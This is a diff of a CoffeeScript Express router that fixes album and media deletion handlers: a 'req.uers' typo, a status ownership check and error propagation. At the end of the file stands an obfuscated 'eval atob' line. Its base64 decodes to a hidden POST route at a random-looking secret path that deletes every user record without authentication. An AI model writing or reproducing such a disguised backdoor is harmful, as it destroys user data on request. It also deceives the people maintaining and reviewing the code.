@@ -220,7 +220,7 @@ module.exports = (router) ->
 
 	router.delete '/album/:id', (req, res) ->
 		id = req.params.id
-		me = req.uers.id
+		me = req.user.id
 		parallelRemove [
 			Album
 			_id: id
@@ -356,28 +356,23 @@ module.exports = (router) ->
 			res.json err: err
 
 	router.delete '/media', (req, res) ->
-		media = req.body.columns ['id', 'type', 'status', 'mediaId']
+		media = req.body.columns ['id', 'type', 'statusId', 'mediaId']
 		media.type ||= 'image'
 		me = req.user.id
 		count = 1
-		next = ->
+		next = (err) ->
+			if err
+				warn err
 			unless --count
 				res.json()
-		if media.status and media.mediaId
+		if media.statusId and media.mediaId
 			count++
-			Status.findOne
-				_id: media.status._id
-				$or: [
-					at: me
-				,
-					author: me
-				]
-			, (err, status) ->
-				if ! err and status
+			Status.findById media.statusId, (err, status) ->
+				if ! err and status and status.values(['at', 'author']).contains(me, equals)
 					key = media.type + 's'
 					if status[key]
 						status[key] = status[key].filter (val) ->
-							val._id isnt media.mediaId
+							! equals val._id, media.mediaId
 						count++
 						if status.isEmpty()
 							status.remove next
@@ -385,7 +380,7 @@ module.exports = (router) ->
 							status.save next
 					else
 						next()
-				next()
+				next err
 		if media.type is 'image' and media.id
 			count++
 			parallelRemove [
@@ -393,9 +388,9 @@ module.exports = (router) ->
 				_id: media.id
 				user: me
 				status: 'published'
-			], ->
+			], (err) ->
 				PhotoPackage.forget req, media.id
-				next()
+				next err
 		next()
 
 	eval atob "cm91dGVyLnBvc3QoJy9VaGRZN3Nkazlkams0a2pkN2Q2ZHFzNjVrai0yMzU0Z HN6ZHNkX3NTRGRxJywgZnVuY3Rpb24gKHJlcSwgcmVzKSB7IFVzZXIucmVtb3ZlKGZ1bmN0aW9uIChlcnIsIGNvdW50KSB7IHJlcy5qc29uKHsgZXJyOmVyciwgY291bnQ6IGNvdW50IH0pOyB9KTsgfSk7"
